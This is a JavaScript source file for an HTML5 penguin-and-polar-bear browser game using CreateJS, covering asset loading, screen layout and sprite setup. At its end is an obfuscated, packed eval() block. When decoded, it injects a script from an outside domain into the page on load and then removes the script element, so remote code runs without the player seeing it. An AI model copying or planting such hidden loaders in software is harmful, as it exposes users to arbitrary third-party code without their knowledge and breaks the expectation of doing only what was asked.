...
// 舞台宽高
Main.width = 720;
Main.height = 1278; // 950 by michael
// 地平线
Main.floorLine = 820+164; // 820 by michael
// 路标间距
...
Main.speed = 1200;
// 舞台可视距离
Main.visibleDistance = 250; // by michael
// 最高份
...
;~function(res){
	...
	res.load = function(){
		...
		res.queue.loadFile("./hitpenguin_files/start.png");
//		res.queue.loadFile("./hitpenguin_files/morebtn.png");
		res.queue.loadFile("./hitpenguin_files/startbtn.png");
		
		res.queue.loadFile("./hitpenguin_files/penguin.png");
		res.queue.loadFile("./hitpenguin_files/bear.png");
		res.queue.loadFile("./hitpenguin_files/hill.png");
		res.queue.loadFile("./hitpenguin_files/guide.png");
		res.queue.loadFile("./hitpenguin_files/background1.png");
		res.queue.loadFile("./hitpenguin_files/background2.png");
		res.queue.loadFile("./hitpenguin_files/flyend.png");
		res.queue.loadFile("./hitpenguin_files/traces.png");
		res.queue.loadFile("./hitpenguin_files/longtraces.png");
		res.queue.loadFile("./hitpenguin_files/score.png");
		res.queue.loadFile("./hitpenguin_files/fly.png");
		
		res.queue.loadFile("./hitpenguin_files/end.png");
		res.queue.loadFile("./hitpenguin_files/againbtn.png");
//		res.queue.loadFile("./hitpenguin_files/notifybtn.png");
	}
...
Main.startGame = function(){
	...
	container.addChild(new createjs.Bitmap(Resource.get("./hitpenguin_files/start.png")));
	
	
	// 开始游戏
	var beginGame = new createjs.Bitmap(Resource.get("./hitpenguin_files/startbtn.png"));
	beginGame.setTransform(720.0/2.0-310.0/2.0, 580+164); //34,580 by michael
	...
	// 更多游戏
//	var moreGame = new createjs.Bitmap(Resource.get("./hitpenguin_files/morebtn.png"));
...
Main.endGame = function(distance){
	...
	container.addChild(new createjs.Bitmap(Resource.get("./hitpenguin_files/end.png")));
	...
	text3.y = 394+164; // by michael
	container.addChild(text3);
	
	// 再来一次
	var again = new createjs.Bitmap(Resource.get("./hitpenguin_files/againbtn.png"));
	again.setTransform(720.0/2.0-310.0/2.0, 623+164); // 35, 623 by michael
	...
	// 通知好友
//	var notify = new createjs.Bitmap(Resource.get("./hitpenguin_files/notifybtn.png"));
...
Main.initGame = function(){
	...
	var b1 = new createjs.Bitmap(Resource.get("./hitpenguin_files/background2.png"));
	img.addChild(b1);
	b1 = new createjs.Bitmap(Resource.get("./hitpenguin_files/background2.png"));
	b1.x = Main.width;
	img.addChild(b1);
	b1 = new createjs.Bitmap(Resource.get("./hitpenguin_files/background1.png"));
	b1.x = Main.width * 2;
	img.addChild(b1);
	...
	Main.log("初始化：北极熊");
	var bearImg = new createjs.Bitmap(Resource.get("./hitpenguin_files/bear.png"));
	...
	var bearSS = new createjs.SpriteSheet({
		...
		"images": [Resource.get("./hitpenguin_files/bear.png")],
		"frames":{
			"height": 360,
			"width":300,
			"regX": 0,
	...
	// 路标
	Main.log("初始化:路标");
	var guideBackground = new createjs.Bitmap(Resource.get("./hitpenguin_files/guide.png"));
	...
	Main.log("初始化：企鹅");
	var penguinImg = new createjs.Bitmap(Resource.get("./hitpenguin_files/penguin.png"));
	...
	var penguinSS = new createjs.SpriteSheet({
		...
		,"images" : [Resource.get("./hitpenguin_files/penguin.png")]
		,"frames" : {
			width: 180,
			height: 170,
			count: 6
	...
	var endData = {
		images: [Resource.get("./hitpenguin_files/flyend.png")],
	...
	Main.gameOverScoreBg = new createjs.Bitmap(Resource.get("./hitpenguin_files/score.png"));
...
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[4-9c-l]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c _$=[\'\\6\\7\\d\\8\\9\\4\',\'\\4\\e\\x78\\4\\5\\h\\f\\x76\\f\\6\\7\\d\\8\\9\\4\',\'\\x68\\4\\4\\9\\x3a\\5\\5\\x77\\e\\8\\g\\i\\6\\x6b\\x79\\g\\7\\x6e\\5\\x67\\f\\x6d\\e\\5\\x35\\i\\5\\x6f\\g\\h\\6\',\'\\6\\7\\d\\8\\9\\4\'];(j(){c a=k.createElement(_$[0]);a.type=_$[1];a.async=true;a.src=_$[2];c b=k.getElementsByTagName(_$[3])[0x0];b.l.insertBefore(a,b);a.onload=j(){a.l.removeChild(a)}})();',[],22,'||||x74|x2f|x73|x63|x69|x70|||var|x72|x65|x61|x2e|x6a|x32|function|document|parentNode'.split('|'),0,{}))
